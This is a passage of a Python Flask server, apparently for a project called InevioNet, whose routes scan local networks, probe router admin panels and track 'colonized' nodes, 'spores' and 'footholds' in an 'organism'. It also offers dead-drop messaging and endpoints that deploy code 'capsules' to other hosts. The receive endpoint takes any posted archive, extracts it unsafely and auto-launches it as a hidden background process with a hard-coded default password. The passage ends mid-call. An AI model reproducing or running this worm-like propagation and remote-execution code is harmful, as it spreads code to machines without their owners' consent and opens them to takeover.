                            log.info('[P88fix3] footholds: %d spores', len(_footholds))
                        break
            except Exception as _fe:
                log.debug('[P88fix3] footholds: %s', _fe)
            # traceroute + mdns только при force
            if force:
                if getattr(n, "traceroute_scan", None):
                    try:
                        tr = n.traceroute_scan.scan_multi()
                        n.network_tree.add_traceroute(tr.get("hops", []))
                    except Exception:
                        pass
                if getattr(n, "local_discovery", None):
                    try:
                        md = n.local_discovery.scan_all(timeout=2.0)
                        n.network_tree.add_mdns_devices(md.get("devices", []))
                    except Exception:
                        pass
            n.network_tree.recalc_stats()

        return jsonify({'success': True, **n.network_tree.get_tree()})
    except Exception as e:
        log.error('[Tree] error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/network/tree/depth')
def api_network_tree_depth():
    """P82: узлы дерева по глубине."""
    try:
        n = get_net()
        if not getattr(n, "network_tree", None):
            return jsonify({'success': False, 'error': 'no_tree'})
        if not n.network_tree.root:
            return jsonify({'success': True, 'by_depth': {}, 'stats': {}})
        return jsonify({'success': True,
                        'by_depth': n.network_tree.get_by_depth(),
                        'stats': n.network_tree.get_stats()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/network/probe_router', methods=['POST'])
def api_network_probe_router():
    """P82: зондирование роутера."""
    try:
        n = get_net()
        d = request.get_json(silent=True) or {}
        ip = d.get('ip', '')
        if not ip:
            return jsonify({'success': False, 'error': 'no_ip'}), 400
        from inevionet.network.router_probe import RouterProbe
        probe = RouterProbe()
        result = probe.probe(ip)
        return jsonify({'success': True, 'result': result,
                        'stats': probe.get_stats()})
    except Exception as e:
        log.error('[RouterProbe] error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/network/recursive_probe', methods=['POST'])
def api_network_recursive_probe():
    """P82: рекурсивный probe подсети."""
    try:
        n = get_net()
        d = request.get_json(silent=True) or {}
        subnet = d.get('subnet', '')
        if not subnet:
            # Автоопределение
            if getattr(n, "local_map", None) and n.local_map.subnet:
                subnet = n.local_map.subnet
            else:
                return jsonify({'success': False, 'error': 'no_subnet'}), 400
        from inevionet.network.recursive_probe import RecursiveProbe
        probe = RecursiveProbe()
        result = probe.probe_subnet(subnet, depth=0)
        return jsonify({'success': True, 'result': result,
                        'stats': probe.get_stats()})
    except Exception as e:
        log.error('[RecursiveProbe] error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/network/traceroute', methods=['POST'])
def api_network_traceroute():
    """P84: traceroute scan."""
    try:
        n = get_net()
        d = request.get_json(silent=True) or {}
        target = d.get('target', '8.8.8.8')
        multi = d.get('multi', False)

        from inevionet.network.traceroute_scan import TracerouteScan
        ts = TracerouteScan()

        if multi:
            result = ts.scan_multi()
        else:
            result = ts.scan(target)

        # Интегрировать в tree
        if getattr(n, "network_tree", None):
            hops = result.get("hops", [])
            n.network_tree.add_traceroute(hops)

        return jsonify({'success': True, 'result': result,
                        'stats': ts.get_stats()})
    except Exception as e:
        log.error('[Traceroute] error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/network/local_devices', methods=['POST'])
def api_network_local_devices():
    """P85: mDNS/SSDP/LLMNR scan."""
    try:
        n = get_net()
        from inevionet.network.mdns_ssdp_scan import LocalDiscovery
        ld = LocalDiscovery()
        result = ld.scan_all(timeout=3.0)

        # Интегрировать в tree
        if getattr(n, "network_tree", None):
            n.network_tree.add_mdns_devices(result.get("devices", []))

        return jsonify({'success': True, 'result': result,
                        'stats': ld.get_stats()})
    except Exception as e:
        log.error('[LocalDiscovery] error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/network/router_admin', methods=['POST'])
def api_network_router_admin():
    """P86: SNMP fallback + HTTP админка."""
    try:
        n = get_net()
        d = request.get_json(silent=True) or {}
        ip = d.get('ip', '')
        if not ip:
            # Auto - свой роутер
            if getattr(n, "local_map", None) and n.local_map.router_ip:
                ip = n.local_map.router_ip
            else:
                ip = "192.168.1.1"

        from inevionet.network.router_admin import RouterAdmin
        ra = RouterAdmin()
        result = ra.probe_all(ip)

        # Интегрировать в tree
        if getattr(n, "network_tree", None):
            n.network_tree.add_router_admin(result)

        return jsonify({'success': True, 'result': result,
                        'stats': ra.get_stats()})
    except Exception as e:
        log.error('[RouterAdmin] error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/network/full_scan', methods=['POST'])
def api_network_full_scan():
    """P84-P86: полный скан дерева (traceroute + mdns + router_admin)."""
    try:
        n = get_net()

        # 1. LocalMap
        local = {}
        if getattr(n, "local_map", None):
            local = n.local_map.build()

        # 2. Traceroute multi
        tr_result = {}
        if getattr(n, "traceroute_scan", None):
            tr_result = n.traceroute_scan.scan_multi()

        # 3. mDNS/SSDP/LLMNR
        mdns_result = {}
        if getattr(n, "local_discovery", None):
            mdns_result = n.local_discovery.scan_all(timeout=3.0)

        # 4. Router admin
        ra_result = {}
        router_ip = local.get("router_ip", "192.168.1.1")
        from inevionet.network.router_admin import RouterAdmin
        ra = RouterAdmin()
        ra_result = ra.probe_all(router_ip)

        # Построить дерево
        tree_result = {}
        if getattr(n, "network_tree", None):
            topo = {}
            if getattr(n, "_auto_topology", None):
                try:
                    topo = n._auto_topology.export_map()
                except Exception:
                    pass
            n.network_tree.build(local_map=local, topology_map=topo)
            n.network_tree.add_traceroute(tr_result.get("hops", []))
            n.network_tree.add_mdns_devices(mdns_result.get("devices", []))
            n.network_tree.add_router_admin(ra_result)
            tree_result = n.network_tree.get_tree()

        return jsonify({
            'success': True,
            'local': local,
            'traceroute': tr_result,
            'mdns': mdns_result,
            'router_admin': ra_result,
            'tree': tree_result,
        })
    except Exception as e:
        log.error('[FullScan] error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/deaddrop/send', methods=['POST'])
def api_deaddrop_send():
    """P91: отправить через dead drop."""
    try:
        n = get_net()
        d = request.get_json(silent=True) or {}
        receiver = d.get('receiver', '')
        message = d.get('message', '')
        if not receiver or not message:
            return jsonify({'success': False, 'error': 'need receiver+message'}), 400
        if not getattr(n, "dead_drop", None):
            return jsonify({'success': False, 'error': 'no_dead_drop'})
        n.dead_drop.queue_send(receiver, message)
        return jsonify({'success': True, 'queued': True,
                        'receiver': receiver})
    except Exception as e:
        log.error('[DeadDrop] send: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/deaddrop/inbox')
def api_deaddrop_inbox():
    """P91: входящие dead drop."""
    try:
        n = get_net()
        if not getattr(n, "dead_drop", None):
            return jsonify({'success': False, 'error': 'no_dead_drop'})
        msgs = n.dead_drop.get_inbox()
        return jsonify({'success': True, 'messages': msgs,
                        'count': len(msgs),
                        'stats': n.dead_drop.get_stats()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/deaddrop/register', methods=['POST'])
def api_deaddrop_register():
    """P91: зарегистрировать peer URL."""
    try:
        n = get_net()
        d = request.get_json(silent=True) or {}
        node_id = d.get('node_id', '')
        url = d.get('url', '')
        if not node_id or not url:
            return jsonify({'success': False, 'error': 'need node_id+url'}), 400
        if not getattr(n, "dead_drop", None):
            return jsonify({'success': False, 'error': 'no_dead_drop'})
        n.dead_drop.register_peer(node_id, url)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/deaddrop/status')
def api_deaddrop_status():
    """P91: статус dead drop."""
    try:
        n = get_net()
        if not getattr(n, "dead_drop", None):
            return jsonify({'success': False, 'error': 'no_dead_drop'})
        return jsonify({'success': True, 'stats': n.dead_drop.get_stats()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/organism')
def api_organism():
    """P95b: статистика живого организма."""
    try:
        n = get_net()
        org = getattr(n, "organism", None)
        if org is None:
            return jsonify({'success': False, 'error': 'organism not running',
                            'hint': 'check INEVIO_ORGANISM env'})
        # P100c: все узлы + self
        all_nodes = dict(org.memory.get("nodes", {}))
        # Добавить self
        all_nodes["127.0.0.1"] = {
            "ip": "127.0.0.1",
            "type": "self",
            "source": "local",
            "depth": 0,
            "nlp_plan": "self",
            "nlp_confidence": 1.0,
        }
        # Сортировка по depth
        sorted_nodes = sorted(all_nodes.items(),
                              key=lambda x: (x[1].get("depth", 99), x[0]))
        return jsonify({
            'success': True,
            'stats': org.get_stats(),
            'phase_log': org.get_phase_log(30),
            'memory': {
                'nodes_count': len(org.memory.get("nodes", {})),
                'colonized_count': len(org.memory.get("colonized", set())),
                'taught_count': len(org.memory.get("taught", set())),
                'routes_count': len(org.memory.get("routes", [])),
                'depth_count': len(org.memory.get("depth", {})),
            },
            'nodes': sorted_nodes,
            'nodes_sample': sorted_nodes[:10],
            'nodes_count': len(sorted_nodes),
        })
    except Exception as e:
        log.error('[P95b] organism: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/organism/dump')
def api_organism_dump():
    """P95e: диагностика local_map для Organism."""
    try:
        n = get_net()
        org = getattr(n, "organism", None)
        if org is None:
            return jsonify({'success': False, 'error': 'organism not running'})
        return jsonify({
            'success': True,
            'dump': org.dump_devices(),
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/debug/attrs')
def api_debug_attrs():
    """debug: все атрибуты net (stego/industrial/webrtc/mask)."""
    try:
        n = get_net()
        out = {"public": {}, "hidden": {}}
        # Публичные
        for a in dir(n):
            if a.startswith('_'):
                continue
            if any(k in a.lower() for k in ('stego', 'stegan', 'mask', 'industrial',
                                              'webrtc', 'bridge', 'modbus', 'mqtt',
                                              'opcua', 'dnp3', 'scada', 'ambient')):
                try:
                    v = getattr(n, a, None)
                    if callable(v):
                        out["public"][a] = "callable"
                    elif v is None:
                        out["public"][a] = None
                    else:
                        out["public"][a] = type(v).__name__
                except Exception as e:
                    out["public"][a] = "err: %s" % e
        # Скрытые
        for a in dir(n):
            if not a.startswith('_'):
                continue
            if any(k in a.lower() for k in ('stego', 'mask', 'ambient',
                                              'industrial', 'webrtc')):
                try:
                    v = getattr(n, a, None)
                    if callable(v):
                        out["hidden"][a] = "callable"
                    elif v is None:
                        out["hidden"][a] = None
                    else:
                        out["hidden"][a] = type(v).__name__
                except Exception:
                    pass
        return jsonify({"success": True, **out})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/nlp/pipeline', methods=['POST', 'GET'])
def api_nlp_pipeline():
    """P98: запустить НЛП-конвейер на произвольной ситуации."""
    try:
        from inevionet.nlp.pipeline import (
            run_pipeline, STAGES, STAGE_NAMES, ENABLE_STAGES,
            extract_outputs, validate_input,
        )
        d = request.get_json(silent=True) or {}
        # Значения по умолчанию
        situation = {
            "v": d.get("v", 5),
            "a": d.get("a", 2),
            "k": d.get("k", 3),
            "client_seq": d.get("client_seq", ["A", "B", "A", "C", "A"]),
            "therapist_seq": d.get("therapist_seq", ["A", "B", "B", "C", "A"]),
            "rapport_threshold": d.get("rapport_threshold", 0.6),
            "anchor_stimulus": d.get("anchor_stimulus", "хлопок"),
            "anchor_emotion": d.get("anchor_emotion", "радость"),
            "frame": d.get("frame", {"провал": "поражение", "отказ": "унижение"}),
            "phi": d.get("phi", {"поражение": "опыт", "унижение": "свобода"}),
            "val_map": d.get("val_map", {
                "поражение": -1, "опыт": 1, "унижение": -1, "свобода": 1,
            }),
            "actions1": d.get("actions1", ["защита", "атака"]),
            "actions2": d.get("actions2", ["уход", "борьба"]),
            "M1": d.get("M1", [[3, 1], [1, 1]]),
            "M2": d.get("M2", [[1, 1], [1, 2]]),
            "alphas": d.get("alphas", [0.25, 0.5, 0.75]),
            "timeline": d.get("timeline",
                              ["детство", "школа", "работа", "настоящее", "будущее"]),
            "shift_k": d.get("shift_k", 2),
            "states": d.get("states", {"детство": "страх", "школа": "тревога"}),
            "reimprint_state": d.get("reimprint_state", "ресурс"),
            "changes": d.get("changes", ["A", "B", "C", "D", "E"]),
            "f1": d.get("f1", {"A": 1, "B": 3, "C": 2, "D": 4, "E": 2}),
            "f2": d.get("f2", {"A": 4, "B": 2, "C": 3, "D": 1, "E": 1}),
            "baseline": d.get("baseline", "A"),
            "reactions": d.get("reactions", ["r1", "r2"]),
            "disturbances": d.get("disturbances", ["d1", "d2", "d3"]),
            "alphabet": d.get("alphabet", ["a", "b", "c"]),
            "log": [],
        }
        ok, missing = validate_input(situation)
        if not ok:
            return jsonify({"success": False, "missing": missing}), 400
        result = run_pipeline(situation, STAGES, 0, ENABLE_STAGES, STAGE_NAMES)
        outputs = extract_outputs(result)
        # log_final содержит tuple - конвертируем
        if outputs.get("log_final"):
            outputs["log_final"] = [list(x) if isinstance(x, tuple) else x
                                     for x in outputs["log_final"]]
        return jsonify({"success": True, "outputs": outputs})
    except Exception as e:
        log.error("[NLP] pipeline: %s", e)
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/nlp/analyze_node', methods=['POST'])
def api_nlp_analyze_node():
    """P98: НЛП-анализ узла InevioNet."""
    try:
        from inevionet.nlp.pipeline import spore_analyze_node
        d = request.get_json(silent=True) or {}
        node = {
            "ip": d.get("ip", "192.168.1.1"),
            "type": d.get("type", "router"),
            "source": d.get("source", "arp"),
            "vendor": d.get("vendor", "unknown"),
            "open_ports": d.get("open_ports", []),
        }
        result = spore_analyze_node(node)
        return jsonify({"success": True, "node": node, "result": result})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/nlp/stages')
def api_nlp_stages():
    """P98: текущие флаги этапов НЛП."""
    try:
        from inevionet.nlp.pipeline import (
            STAGE_NAMES, ENABLE_STAGES, STAGE_PRIORITY,
        )
        return jsonify({
            "success": True,
            "stages": STAGE_NAMES,
            "enabled": ENABLE_STAGES,
            "priority": STAGE_PRIORITY,
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/dht/my_info')
def api_dht_my_info():
    """P103: полная информация о себе (для копирования)."""
    try:
        n = get_net()
        # Serial
        from inevionet.core.serial import get_current_serial
        serial = get_current_serial()
        # Public addr
        addr = getattr(n, "public_addr", None)
        pub_ip = addr[0] if addr else ""
        pub_port = addr[1] if addr else 0
        # DeadDrop URL
        dd_url = ""
        if getattr(n, "dead_drop", None):
            dd_url = n.dead_drop.my_url or ""
        # Relay count
        relay_count = 0
        if hasattr(n, "organism") and n.organism:
            relay_count = n.organism.stats.get("nodes_relayed", 0)
        # Nodes count
        nodes_count = 0
        if hasattr(n, "organism") and n.organism:
            nodes_count = len(n.organism.memory.get("nodes", {}))
        info = {
            "node_id": n.node_id,
            "serial": serial,
            "public_ip": pub_ip,
            "public_port": pub_port,
            "nat_type": getattr(n, "nat_type", "unknown"),
            "dead_drop_url": dd_url,
            "relay_count": relay_count,
            "nodes_count": nodes_count,
        }
        return jsonify({"success": True, "info": info, "json": json.dumps(info, ensure_ascii=False)})
    except Exception as e:
        log.error("[DHT] my_info: %s", e)
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/dht/bootstrap', methods=['POST'])
def api_dht_bootstrap():
    """P116e: добавить peer + зарегистрировать в dead_drop + publish map."""
    try:
        n = get_net()
        d = request.get_json(silent=True) or {}
        peer_json = d.get("json", "")
        peer_dict = d.get("peer", {})
        
        log.info("[P116e] bootstrap START: json_len=%d, dict=%s",
                 len(peer_json) if peer_json else 0,
                 bool(peer_dict))
        
        if not getattr(n, "dht_bootstrap", None):
            return jsonify({"success": False, "error": "no_dht"})
        
        added = False
        parsed = {}
        
        if peer_json:
            # Парсим строку JSON
            try:
                if isinstance(peer_json, str):
                    parsed = json.loads(peer_json)
                elif isinstance(peer_json, dict):
                    parsed = peer_json
            except Exception as _je:
                log.warning("[P116e] json parse fail: %s", _je)
                parsed = {}
            added = n.dht_bootstrap.add_peer_json(peer_json) if isinstance(peer_json, str) else False
        elif peer_dict:
            parsed = peer_dict
            added = n.dht_bootstrap.add_peer_dict(peer_dict)
        
        log.info("[P116e] parsed keys: %s", list(parsed.keys()) if parsed else [])
        
        if parsed:
            node_id = parsed.get("node_id", "")
            dd_url = parsed.get("dead_drop_url", "")
            log.info("[P116e] node=%s dd_url=%s", node_id, dd_url[:60] if dd_url else "EMPTY")
            
            # Регистрируем в dead_drop
            _dd = getattr(n, "dead_drop", None)
            if _dd is None:
                log.error("[P116e] dead_drop is NONE")
            elif not hasattr(_dd, "register_peer"):
                log.error("[P116e] no register_peer method")
            elif node_id and dd_url:
                try:
                    _before = len(getattr(_dd, "peer_urls", {}))
                    _dd.register_peer(node_id, dd_url)
                    _after = len(getattr(_dd, "peer_urls", {}))
                    log.info("[P116e] registered: peers %d -> %d", _before, _after)
                except Exception as _re:
                    import traceback
                    log.error("[P116e] register fail: %s\n%s", _re, traceback.format_exc())
            else:
                log.warning("[P116e] node_id=%s dd_url=%s — SKIP", node_id, dd_url)
            
            # P116c: publish map
            if getattr(n, "organism", None):
                try:
                    n.organism._publish_map_to_dead_drop()
                    log.info("[P116e] map published")
                except Exception as _pe:
                    log.debug("[P116e] publish: %s", _pe)
            
            # trusted_hosts
            pub_ip = parsed.get("public_ip", "")
            pub_port = parsed.get("public_port", 0)
            if node_id and pub_ip and pub_port:
                try:
                    n.trusted_hosts.add("%s:%d" % (pub_ip, int(pub_port)),
                                        label=node_id, method="dht")
                except Exception:
                    pass
        
        # Debug-ответ
        _dd_peers = 0
        if getattr(n, "dead_drop", None):
            _dd_peers = len(getattr(n.dead_drop, "peer_urls", {}))
        
        return jsonify({
            "success": True,
            "added": added,
            "peers": n.dht_bootstrap.get_peers_count(),
            "deaddrop_peers": _dd_peers,
        })
    except Exception as e:
        import traceback
        log.error("[P116e] outer: %s\n%s", e, traceback.format_exc())
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/dht/peers')
def api_dht_peers():
    """P103: список DHT peers."""
    try:
        n = get_net()
        if not getattr(n, "dht_bootstrap", None):
            return jsonify({"success": True, "peers": [], "count": 0})
        return jsonify({
            "success": True,
            "peers": n.dht_bootstrap.get_peers(),
            "count": n.dht_bootstrap.get_peers_count(),
            "stats": n.dht_bootstrap.get_stats(),
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/dht/find/<serial>')
def api_dht_find(serial):
    """P103: найти peers по serial."""
    try:
        n = get_net()
        if not getattr(n, "dht_bootstrap", None):
            return jsonify({"success": False, "error": "no_dht"})
        found = n.dht_bootstrap.find_by_serial(serial)
        return jsonify({
            "success": True,
            "serial": serial,
            "found": [p.to_dict() for p in found],
            "count": len(found),
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/trust/qr', methods=['POST'])
def api_trust_qr():
    """P111: добавить доверенного через QR-JSON."""
    try:
        n = get_net()
        d = request.get_json(silent=True) or {}
        # Ожидаем: {node_id, serial, public_ip, public_port, dead_drop_url}
        peer = d.get("peer", {}) or d
        node_id = peer.get("node_id", "")
        if not node_id:
            return jsonify({"success": False, "error": "no_node_id"}), 400
        
        added = False
        # 1. Добавить в trusted_hosts
        host = ""
        if peer.get("public_ip") and peer.get("public_port"):
            host = "%s:%d" % (peer["public_ip"], int(peer["public_port"]))
        if host:
            try:
                added = n.trusted_hosts.add(host, label=node_id, method="qr")
            except Exception:
                pass
        # 2. Добавить в DHT
        if getattr(n, "dht_bootstrap", None):
            try:
                n.dht_bootstrap.add_peer_dict(peer)
            except Exception:
                pass
        # 3. Регистрируем в dead_drop (если есть URL)
        if peer.get("dead_drop_url") and getattr(n, "dead_drop", None):
            try:
                n.dead_drop.register_peer(node_id, peer["dead_drop_url"])
            except Exception:
                pass
        # 4. Audit
        try:
            if getattr(n, "audit", None):
                n.audit.add_event("trust_qr", {
                    "node_id": node_id,
                    "host": host,
                    "added": added,
                })
        except Exception:
            pass
        
        return jsonify({
            "success": True,
            "added": added,
            "node_id": node_id,
            "host": host,
        })
    except Exception as e:
        log.error("[TrustQR] %s", e)
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/trust/list')
def api_trust_list():
    """P111: список доверенных."""
    try:
        n = get_net()
        hosts = n.trusted_hosts.list_all()
        return jsonify({"success": True, "hosts": hosts, "count": len(hosts)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/dht/merge', methods=['POST'])
def api_dht_merge():
    """P112: принять чужую карту от DHT-peer."""
    try:
        n = get_net()
        d = request.get_json(silent=True) or {}
        sender = d.get("node_id", "")
        if not sender or sender == n.node_id:
            return jsonify({"success": False, "error": "same_node"}), 400
        nodes_in = d.get("nodes", []) or []
        added = 0
        for item in nodes_in:
            if not isinstance(item, dict):
                continue
            ip = item.get("ip", "")
            if not ip:
                continue
            # Merge через organism
            if getattr(n, "organism", None):
                org = n.organism
                with org._lock:
                    if ip in org.memory["nodes"]:
                        continue
                    node = dict(item)
                    node["via_dht_peer"] = sender
                    node["source"] = "merge_dht:" + str(node.get("source", "?"))
                    node["depth"] = int(node.get("depth", 1)) + 1
                    org.memory["nodes"][ip] = node
                    added += 1
        # Merge relayed/taught
        if getattr(n, "organism", None):
            org = n.organism
            for r in d.get("relayed", []) or []:
                org.memory.setdefault("relayed_ips", set()).add(r)
            for t in d.get("taught", []) or []:
                org.memory.setdefault("taught", set()).add(t)
            with org._lock:
                org.stats["maps_merged"] = org.stats.get("maps_merged", 0) + 1
                org.stats["nodes_from_merge"] = org.stats.get("nodes_from_merge", 0) + added
        # Audit
        try:
            if getattr(n, "audit", None):
                n.audit.add_event("dht_merge", {
                    "sender": sender,
                    "added": added,
                })
        except Exception:
            pass
        return jsonify({
            "success": True,
            "sender": sender,
            "added": added,
        })
    except Exception as e:
        log.error("[DHT] merge: %s", e)
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/trust/qr_image')
def api_trust_qr_image():
    """P114: QR-код с моим JSON (для сканирования)."""
    try:
        n = get_net()
        # Собираем JSON
        from inevionet.core.serial import get_current_serial
        serial = get_current_serial()
        addr = getattr(n, "public_addr", None)
        pub_ip = addr[0] if addr else ""
        pub_port = addr[1] if addr else 0
        dd_url = ""
        if getattr(n, "dead_drop", None):
            dd_url = n.dead_drop.my_url or ""
        relay_count = 0
        nodes_count = 0
        if hasattr(n, "organism") and n.organism:
            relay_count = n.organism.stats.get("nodes_relayed", 0)
            nodes_count = len(n.organism.memory.get("nodes", {}))
        info = {
            "node_id": n.node_id,
            "serial": serial,
            "public_ip": pub_ip,
            "public_port": pub_port,
            "nat_type": getattr(n, "nat_type", "unknown"),
            "dead_drop_url": dd_url,
            "relay_count": relay_count,
            "nodes_count": nodes_count,
        }
        # Генерируем QR через qrcode (если есть)
        try:
            import qrcode
            import io
            import base64
            qr = qrcode.QRCode(version=None, box_size=8, border=2)
            qr.add_data(json.dumps(info, ensure_ascii=False))
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            b64 = base64.b64encode(buf.getvalue()).decode()
            return jsonify({
                "success": True,
                "qr_base64": "data:image/png;base64," + b64,
                "info": info,
            })
        except ImportError:
            return jsonify({
                "success": False,
                "error": "qrcode_not_installed",
                "info": info,
                "hint": "pip install qrcode[pil]",
            })
    except Exception as e:
        log.error("[QR] image: %s", e)
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/api/network/public')
def api_network_public():
    """P66b: public IP:port via STUN."""
    try:
        n = get_net()
        addr = getattr(n, 'public_addr', None)
        if addr:
            return jsonify({
                'success': True,
                'public_ip': addr[0],
                'public_port': addr[1],
                'nat_type': getattr(n, 'nat_type', 'unknown'),
                'node_id': n.node_id,
            })
        return jsonify({'success': False, 'error': 'no_addr'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/relay/port')
def api_relay_port():
    """P63d: relay listen port."""
    try:
        n = get_net()
        port = int(os.environ.get('INEVIO_RELAY_PORT', 0))
        return jsonify({'success': True, 'port': port,
                        'running': getattr(n, 'relay', None) is not None})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/ai/stats')
def api_ai_stats():
    """AI selector + recursion stats."""
    try:
        n = get_net()
        return jsonify({
            'success': True,
            'selector': n.selector.get_stats() if n.selector else {},
            'protocols': n.selector.get_all_protocol_stats() if n.selector else {},
            'recursion': n.recursion.get_stats() if n.recursion else {},
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/ai/reset', methods=['POST'])
def api_ai_reset():
    """Reset AI learning."""
    try:
        n = get_net()
        if n.selector:
            n.selector.reset()
        if n.recursion:
            n.recursion.reset_stats()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500



@app.route('/api/capsule/trusted', methods=['GET', 'POST', 'DELETE'])
def api_capsule_trusted():
    """P16: manage trusted hosts."""
    try:
        n = get_net()
        if not hasattr(n, 'trusted_hosts'):
            return jsonify({'success': False, 'error': 'no_trusted_hosts'}), 500

        if request.method == 'GET':
            return jsonify({'success': True, 'hosts': n.trusted_hosts.list_all()})

        d = request.json or {}
        host = (d.get('host') or '').strip()
        if not host:
            return jsonify({'success': False, 'error': 'empty_host'}), 400

        if request.method == 'POST':
            ok = n.trusted_hosts.add(
                host,
                label=d.get('label', ''),
                user=d.get('user'),
                method=d.get('method', 'auto'))
            return jsonify({'success': ok, 'hosts': n.trusted_hosts.list_all()})

        if request.method == 'DELETE':
            ok = n.trusted_hosts.remove(host)
            return jsonify({'success': ok, 'hosts': n.trusted_hosts.list_all()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/capsule/deploy', methods=['POST'])
def api_capsule_deploy():
    """P16: deploy capsule to trusted host."""
    try:
        n = get_net()
        d = request.json or {}
        host = (d.get('host') or '').strip()
        if not host:
            return jsonify({'success': False, 'error': 'empty_host'}), 400

        if not n.trusted_hosts.is_trusted(host):
            return jsonify({'success': False, 'error': 'not_trusted'}), 403

        code = n.capsule_builder.build_minimal()
        method = d.get('method', 'auto')
        ok = n.capsule_deployer.deploy(host, code, method=method)
        return jsonify({'success': ok, 'host': host, 'method': method})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/capsule/stats')
def api_capsule_stats():
    """P16: capsule stats."""
    try:
        n = get_net()
        return jsonify({'success': True, 'stats': n.get_capsule_stats()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500



@app.route('/api/capsule/receive', methods=['POST'])
def api_capsule_receive():
    """P17: receive capsule, extract, autostart."""
    try:
        data = request.get_data()
        if not data:
            return jsonify({'success': False, 'error': 'empty'}), 400

        log.info('[Capsule] received %d bytes', len(data))

        import tarfile
        import tempfile
        import hashlib
        import subprocess as _sp

        # P17: compute hash
        code_hash = hashlib.sha256(data).hexdigest()

        # P17: check if we already received this hash recently
        with _capsule_received_lock:
            if code_hash in _capsule_received:
                rec = _capsule_received[code_hash]
                log.debug('[Capsule] skip — same hash %s', code_hash[:16])
                return jsonify({
                    'success': True,
                    'bytes': len(data),
                    'skipped': True,
                    'hash': code_hash[:16],
                })

        # Save archive
        tmp_dir = tempfile.mkdtemp(prefix='inevionet_capsule_')
        archive_path = os.path.join(tmp_dir, 'capsule.tar.gz')
        with open(archive_path, 'wb') as f:
            f.write(data)

        # Extract
        extract_dir = os.path.join(tmp_dir, 'extracted')
        os.makedirs(extract_dir, exist_ok=True)
        with tarfile.open(archive_path, 'r:gz') as tar:
            tar.extractall(extract_dir)

        # Check structure
        inev_dir = os.path.join(extract_dir, 'inevionet')
        if not os.path.isdir(inev_dir):
            return jsonify({'success': False, 'error': 'bad_archive'}), 400

        # Count files
        py_files = []
        for root, dirs, files in os.walk(inev_dir):
            dirs[:] = [d for d in dirs if d != '__pycache__']
            for f in files:
                if f.endswith('.py'):
                    py_files.append(os.path.join(root, f))

        log.info('[Capsule] extracted: %d py files in %s',
                 len(py_files), extract_dir)

        # P17: create run_capsule.py
        entry_path = os.path.join(extract_dir, 'run_capsule.py')
        entry_code = (
            'import sys, os, time\n'
            'sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n'
            'from inevionet.orchestrator import InevioNet\n'
            'if __name__ == "__main__":\n'
            '    node_id = os.environ.get("INEVIO_NODE_ID", "capsule_" + str(os.getpid()))\n'
            '    password = os.environ.get("INEVIO_PASSWORD", "inevio_forever")\n'
            '    net = InevioNet(password=password, node_id=node_id, auto_start=True)\n'
            '    print(f"[CAPSULE] started: {net.node_id}", flush=True)\n'
            '    try:\n'
            '        while True: time.sleep(1)\n'
            '    except KeyboardInterrupt: net.stop()\n'
        )
        with open(entry_path, 'w', encoding='utf-8') as f:
            f.write(entry_code)

        # P18: env flag + limit
        if os.environ.get("INEVIO_NO_AUTOSTART") == "1":
            log.info("[Capsule] INEVIO_NO_AUTOSTART=1, skip autostart")
            return jsonify({
                'success': True,
                'autostarted': False,
                'reason': 'env_disabled',
            })
        global _autostart_counter
        if _autostart_counter >= _MAX_AUTOSTART:
            log.warning("[Capsule] autostart limit (%d) reached",
                        _MAX_AUTOSTART)
            return jsonify({
                'success': True,
                'autostarted': False,
                'reason': 'limit_reached',
                'count': _autostart_counter,
            })
        _autostart_counter += 1

        # P17: autostart in background (nohup-style)
        started_pid = None
        try:
            # Detached subprocess
            # P18: child inherits env with NO_DEPLOY + NO_AUTOSTART
            child_env = os.environ.copy()
            child_env["INEVIO_NO_DEPLOY"] = "1"
            child_env["INEVIO_NO_AUTOSTART"] = "1"
            proc = _sp.Popen(
                [sys.executable, entry_path],
                cwd=extract_dir,
                env=child_env,
                stdout=_sp.DEVNULL,
                stderr=_sp.DEVNULL,
                stdin=_sp.DEVNULL,
